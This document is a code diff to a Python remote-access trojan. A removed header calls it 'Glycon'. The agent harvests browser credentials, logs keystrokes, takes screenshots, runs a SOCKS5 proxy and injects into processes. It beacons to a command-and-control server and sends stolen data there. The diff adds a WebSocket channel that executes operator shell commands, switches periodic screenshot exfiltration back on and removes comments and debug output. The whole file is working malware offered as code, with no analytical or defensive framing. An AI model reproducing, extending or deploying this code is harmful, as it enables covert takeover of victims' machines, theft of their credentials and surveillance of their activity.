@@ -26,9 +26,10 @@ import select
 from pynput import keyboard
 import configparser
 import xml.etree.ElementTree as ET
+import socketio
 
 # ======================
-# Glycon - Configuration
+# Configuration
 # ======================
 class Config:
     def __init__(self):
@@ -42,7 +43,7 @@ class Config:
         self.DEBUG = True
 
 # ======================
-# Encryption Utilities
+# Encryption
 # ======================
 class Crypto:
     def __init__(self, key, iv):
@@ -54,14 +55,12 @@ class Crypto:
         self.iv = iv
 
     def encrypt(self, data):
-        """Encrypt data with proper padding"""
         cipher = AES.new(self.key, AES.MODE_CBC, self.iv)
         padded_data = pad(json.dumps(data).encode(), AES.block_size)
         ct_bytes = cipher.encrypt(padded_data)
         return base64.b64encode(ct_bytes).decode()
 
     def decrypt(self, enc_data):
-        """Decrypt data with proper unpadding"""
         cipher = AES.new(self.key, AES.MODE_CBC, self.iv)
         ct = base64.b64decode(enc_data)
         pt = cipher.decrypt(ct)
@@ -216,7 +215,6 @@ class SystemUtils:
     @staticmethod
     def take_screenshot():
         try:
-            # Ensure pyautogui can take screenshots on headless systems
             if platform.system() == 'Windows':
                 os.environ['DISPLAY'] = ':0.0'
             
@@ -226,8 +224,6 @@ class SystemUtils:
             buffered.seek(0)
             return base64.b64encode(buffered.read()).decode('utf-8')
         except Exception as e:
-            if Config.DEBUG:
-                print(f"[!] Screenshot error: {str(e)}")
             return None
 
     @staticmethod
@@ -320,7 +316,7 @@ class SystemUtils:
             return {"error": str(e)}
 
 # ======================
-# Persistence Mechanisms
+# Persistence
 # ======================
 class Persistence:
     @staticmethod
@@ -459,7 +455,7 @@ class ProcessInjector:
             return {"status": "error", "message": str(e)}
 
 # ======================
-# SOCKS5 Proxy Server
+# SOCKS5 Proxy
 # ======================
 class SOCKS5Proxy:
     def __init__(self, port):
@@ -596,7 +592,100 @@ class Keylogger:
                 self.log += f"[{key}]"
 
 # ======================
-# Main Agent Class (Fixed)
+# WebSocket Client
+# ======================
+class WebSocketClient:
+    def __init__(self, agent_id, crypto, server_url):
+        self.agent_id = agent_id
+        self.crypto = crypto
+        self.server_url = server_url.replace('https://', 'wss://').replace('http://', 'ws://') + '/terminal'
+        self.socket = None
+        self.running = False
+        self.current_dir = os.getcwd()
+
+    def connect(self):
+        try:
+            self.socket = socketio.Client()
+            self.socket.connect(self.server_url)
+            self.socket.emit('agent_connect', {
+                'agent_id': self.agent_id,
+                'auth_token': self.crypto.encrypt({'agent_id': self.agent_id})
+            })
+            
+            @self.socket.on('command')
+            def handle_command(data):
+                try:
+                    decrypted = self.crypto.decrypt(data['encrypted'])
+                    command = decrypted['command']
+                    
+                    result = self._execute_command(command)
+                    self.socket.emit('command_result', {
+                        'agent_id': self.agent_id,
+                        'encrypted': self.crypto.encrypt(result)
+                    })
+                except Exception as e:
+                    self.socket.emit('command_error', {
+                        'agent_id': self.agent_id,
+                        'error': str(e)
+                    })
+
+            self.running = True
+            return True
+        except Exception as e:
+            if Config.DEBUG:
+                print(f"[!] WebSocket connection error: {str(e)}")
+            return False
+
+    def _execute_command(self, command):
+        try:
+            if command.lower().startswith('cd '):
+                new_dir = command[3:].strip()
+                try:
+                    if new_dir:
+                        os.chdir(new_dir)
+                    self.current_dir = os.getcwd()
+                    return {
+                        'status': 'success',
+                        'output': f"Current directory is now: {self.current_dir}",
+                        'current_dir': self.current_dir
+                    }
+                except Exception as e:
+                    return {
+                        'status': 'error',
+                        'error': str(e),
+                        'current_dir': self.current_dir
+                    }
+
+            result = subprocess.run(
+                command,
+                shell=True,
+                cwd=self.current_dir,
+                stdout=subprocess.PIPE,
+                stderr=subprocess.PIPE,
+                text=True
+            )
+
+            self.current_dir = os.getcwd()
+            return {
+                'status': 'success',
+                'output': result.stdout,
+                'error': result.stderr,
+                'current_dir': self.current_dir
+            }
+        except Exception as e:
+            return {
+                'status': 'error',
+                'error': str(e),
+                'current_dir': self.current_dir
+            }
+
+    def disconnect(self):
+        if self.socket:
+            self.socket.disconnect()
+        self.running = False
+
+# ======================
+# Main Agent Class
 # ======================
 class Agent:
     def __init__(self):
@@ -605,6 +694,7 @@ class Agent:
         self.agent_id = self._generate_agent_id()
         self.socks_proxy = SOCKS5Proxy(self.config.SOCKS5_PORT)
         self.keylogger = Keylogger()
+        self.ws_client = None
         self.last_checkin = 0
         self.jitter = 0.3
         self._initial_checkin = None
@@ -612,11 +702,9 @@ class Agent:
         self._running = True
 
     def _generate_agent_id(self):
-        """Generate a unique agent ID"""
         return f"{platform.node()}-{os.getlogin()}-{hash(os.getcwd())}"
 
     def _get_checkin_data(self):
-        """Prepare data for C2 checkin"""
         data = {
             "agent_id": self.agent_id,
             "hostname": platform.node(),
@@ -627,7 +715,6 @@ class Agent:
             "timestamp": datetime.now().isoformat()
         }
 
-        # Send credentials on first checkin or once per day
         if not self._initial_checkin or (time.time() - self._initial_checkin) > 86400:
             data["credentials"] = {
                 "browsers": CredentialHarvester.get_chrome_credentials() + 
@@ -638,11 +725,10 @@ class Agent:
             if not self._initial_checkin:
                 self._initial_checkin = time.time()
 
-        # Send screenshot every 10th checkin
-        #if self._checkin_count % 10 == 0:
-        #    screenshot = SystemUtils.take_screenshot()
-        #    if screenshot:
-        #        data["screenshot"] = screenshot
+        if self._checkin_count % 10 == 0:
+            screenshot = SystemUtils.take_screenshot()
+            if screenshot:
+                data["screenshot"] = screenshot
 
         self._checkin_count += 1
         return data
@@ -651,34 +737,29 @@ class Agent:
         try:
             task_type = task.get("type")
             
-            if task_type == "shell":
+            if task_type == "terminal":
                 command = task.get("cmd", "")
-                if not command:  # Get command from task_data if not in root
+                if not command:
                     task_data = task.get("data", {})
                     command = task_data.get("cmd", "")
                 
-                # Get current directory before executing command
                 current_dir = os.getcwd()
                 
-                # Handle cd command specially
                 if command.lower().startswith("cd "):
                     new_dir = command[3:].strip()
                     try:
                         if new_dir:
-                            # Handle special path cases
                             if new_dir == "..":
                                 os.chdir("..")
                             elif new_dir == ".":
-                                pass  # No change
+                                pass
                             elif new_dir == "\\":
-                                os.chdir("\\")  # Root directory
+                                os.chdir("\\")
                             elif new_dir.startswith("\\"):
-                                os.chdir(new_dir)  # Absolute path
+                                os.chdir(new_dir)
                             else:
-                                # Handle relative paths
                                 os.chdir(os.path.join(current_dir, new_dir))
                         
-                        # Get and normalize updated directory
                         current_dir = os.getcwd()
                         current_dir = os.path.normpath(current_dir)
                         
@@ -698,11 +779,10 @@ class Agent:
                             "error": str(e),
                             "terminal": True,
                             "task_id": task.get("task_id"),
-                            "current_dir": current_dir,  # Return original directory on error
+                            "current_dir": current_dir,
                             "command": command
                         }
                 
-                # Handle dir command specially for Windows-style output
                 if command.strip().lower() == "dir":
                     try:
                         dir_output = []
@@ -710,17 +790,13 @@ class Agent:
                         total_size = 0
                         dir_count = 0
                         
-                        # Get directory listing with proper metadata
                         for item in os.listdir(current_dir):
                             full_path = os.path.join(current_dir, item)
                             try:
                                 stat = os.stat(full_path)
-                                
-                                # Format date
                                 mtime = datetime.fromtimestamp(stat.st_mtime)
                                 date_str = mtime.strftime("%d.%m.%Y %H:%M")
                                 
-                                # Format size or DIR marker
                                 if os.path.isdir(full_path):
                                     size_str = "<DIR>"
                                     dir_count += 1
@@ -729,12 +805,10 @@ class Agent:
                                     total_files += 1
                                     total_size += stat.st_size
                                 
-                                # Format the line
                                 dir_output.append(f"{date_str}  {size_str} {item}")
                             except:
-                                continue  # Skip files we can't access
+                                continue
                         
-                        # Add summary line
                         dir_output.append("")
                         dir_output.append(f"              {total_files} File(s) {total_size:,} bytes".replace(",", " "))
                         dir_output.append(f"              {dir_count} Dir(s)")
@@ -759,7 +833,6 @@ class Agent:
                             "command": command
                         }
                 
-                # For other commands, execute in the current directory
                 result = subprocess.run(
                     command,
                     shell=True,
@@ -774,8 +847,6 @@ class Agent:
                 
                 output = result.stdout.strip()
                 error = result.stderr.strip()
-                
-                # Get current directory after command execution
                 current_dir = os.getcwd()
                 
                 if task.get("terminal", False) or task.get("data", {}).get("terminal", False):
@@ -796,9 +867,6 @@ class Agent:
                     "current_dir": current_dir,
                     "command": command
                 }
-                 
-              
-
             
             elif task_type == "screenshot":
                 screenshot = SystemUtils.take_screenshot()
@@ -848,6 +916,27 @@ class Agent:
                     self.keylogger.stop()
                     return {"logs": result}
             
+            elif task_type == "websocket":
+                action = task.get("action")
+                if action == "start":
+                    if not self.ws_client or not self.ws_client.running:
+                        self.ws_client = WebSocketClient(
+                            self.agent_id,
+                            self.crypto,
+                            self.config.C2_SERVER
+                        )
+                        connected = self.ws_client.connect()
+                        if connected:
+                            return {"status": "success", "message": "WebSocket connected"}
+                        else:
+                            return {"status": "error", "message": "WebSocket connection failed"}
+                else:
+                    if self.ws_client and self.ws_client.running:
+                        self.ws_client.disconnect()
+                        return {"status": "success", "message": "WebSocket disconnected"}
+                    else:
+                        return {"status": "error", "message": "No active WebSocket connection"}
+            
             else:
                 return {"status": "error", "message": "Unknown task type"}
         
@@ -855,38 +944,15 @@ class Agent:
             return {"status": "error", "message": str(e)}
 
     def beacon(self):
-        """Main C2 communication loop"""
         print("[*] Starting beacon loop...")
         while self._running:
             try:
-                # Test basic connection first
-                print("[*] Testing server connectivity...")
-                try:
-                    test_response = requests.get(
-                        f"{self.config.C2_SERVER}",
-                        verify=False,
-                        timeout=10
-                    )
-                    print(f"[*] Server test response: {test_response.status_code}")
-                except Exception as test_error:
-                    print(f"[!] Server test failed: {str(test_error)}")
-                    time.sleep(self.config.CHECKIN_INTERVAL)
-                    continue
-
-                # Calculate sleep time with jitter
                 sleep_time = self.config.CHECKIN_INTERVAL * (1 + (random.random() * self.jitter * 2 - self.jitter))
-                print(f"[*] Sleeping for {sleep_time:.2f} seconds")
                 time.sleep(sleep_time)
                 
-                print("[*] Preparing checkin data...")
                 checkin_data = self._get_checkin_data()
-                print("[+] Checkin data prepared")
-                
-                print("[*] Encrypting data...")
                 encrypted_data = self.crypto.encrypt(checkin_data)
-                print("[+] Data encrypted")
                 
-                print(f"[*] Attempting to connect to {self.config.C2_SERVER}")
                 response = requests.post(
                     f"{self.config.C2_SERVER}/api/checkin",
                     data=encrypted_data,
@@ -897,19 +963,14 @@ class Agent:
                     timeout=30,
                     verify=False
                 )
-                print(f"[*] Server response: {response.status_code}")
                 
                 if response.status_code == 200:
-                    print("[+] Server responded successfully")
                     task = self.crypto.decrypt(response.content)
-                    print(f"[*] Received task: {task.get('type', 'noop')}")
                     
                     if task.get("type") != "noop":
-                        print("[*] Executing task...")
                         result = self._execute_task(task)
-                        print("[+] Task executed, sending results...")
                         
-                        response = requests.post(
+                        requests.post(
                             f"{self.config.C2_SERVER}/api/task_result",
                             data=self.crypto.encrypt({
                                 "task_id": task.get("task_id"),
@@ -924,10 +985,6 @@ class Agent:
                             timeout=30,
                             verify=False
                         )
-                        if response.status_code == 200:
-                            print("[+] Results sent to server")
-                        else:
-                            print(f"[!] Failed to send results: {response.status_code}")
                 
             except requests.exceptions.RequestException as e:
                 print(f"[!] Connection error: {str(e)}")
@@ -937,20 +994,14 @@ class Agent:
                 time.sleep(self.config.CHECKIN_INTERVAL)
 
     def stop(self):
-        """Cleanly stop the agent"""
         self._running = False
         self.socks_proxy.stop()
         self.keylogger.stop()
+        if self.ws_client:
+            self.ws_client.disconnect()
 
     def run(self):
-        """Main entry point for the agent"""
-        print("[*] Checking persistence...")
-        #if not getattr(sys, 'frozen', False):
-            #print("[*] Installing persistence...")
-            #result = Persistence.install()
-            #print(f"[*] Persistence result: {result}")
-        
-        print("[*] Starting beacon...")
+        print("[*] Starting agent...")
         self.beacon()
 
 if __name__ == "__main__":
@@ -970,9 +1021,7 @@ if __name__ == "__main__":
     
     try:
         print("[*] Starting agent...")
-        print("[*] Initializing components...")
         agent = Agent()
-        print("[*] Starting main loop...")
         agent.run()
     except Exception as e:
         print(f"[!] Agent crashed: {str(e)}")
